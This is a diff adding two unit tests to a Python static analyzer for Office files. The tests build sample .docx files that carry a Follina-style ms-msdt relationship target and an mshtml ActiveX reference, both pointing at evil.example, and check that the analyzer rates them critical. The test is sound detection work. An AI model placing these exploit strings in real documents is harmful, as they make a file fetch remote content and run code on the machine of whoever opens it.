@@ -157,6 +157,54 @@ class StaticAnalyzerTests(unittest.TestCase):
         self.assertTrue(any(component["key"] == "relationship" for component in components))
         self.assertTrue(any(component["key"] == "macro" for component in components))
 
+    def test_docx_office_exploit_protocols_are_critical(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            sample = Path(temp_dir) / "follina_like.docx"
+            build_ooxml(
+                sample,
+                {
+                    "word/_rels/document.xml.rels": (
+                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+                        '<Relationship Id="rIdExploit" '
+                        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
+                        'Target="mhtml:http://evil.example/a.html!x-usc:ms-msdt:/id PCWDiagnostic" '
+                        'TargetMode="External"/>'
+                        "</Relationships>"
+                    ),
+                    "word/document.xml": (
+                        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+                        '<w:body><w:object><o:OLEObject Type="Link" r:id="rIdExploit"/></w:object></w:body>'
+                        "</w:document>"
+                    ),
+                },
+            )
+            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
+
+        titles = {finding.title for finding in result.findings}
+        self.assertIn("Office Exploit Protocol Relationship", titles)
+        self.assertIn("OOXML Office Exploit Protocol", titles)
+        self.assertEqual(result.risk_level, "critical")
+
+    def test_docx_mshtml_activex_markers_are_critical(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            sample = Path(temp_dir) / "active_x.docx"
+            build_ooxml(
+                sample,
+                {
+                    "word/activeX/activeX1.xml": (
+                        '<ax:ocx ax:classid="{D27CDB6E-AE6D-11cf-96B8-444553540000}" '
+                        'xmlns:ax="http://schemas.microsoft.com/office/2006/activeX">'
+                        "<ax:ocxPr ax:name=\"HTMLFile\" ax:value=\"mshtml:http://evil.example/payload.html\"/>"
+                        "</ax:ocx>"
+                    ),
+                },
+            )
+            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
+
+        titles = {finding.title for finding in result.findings}
+        self.assertIn("OOXML MSHTML/ActiveX Exploit Markers", titles)
+        self.assertEqual(result.risk_level, "critical")
+
     def test_excel_macro_enabled_variants_are_supported(self) -> None:
         for file_name in ("addin.xlam", "template.xltm", "binary.xlsb"):
             with self.subTest(file_name=file_name):
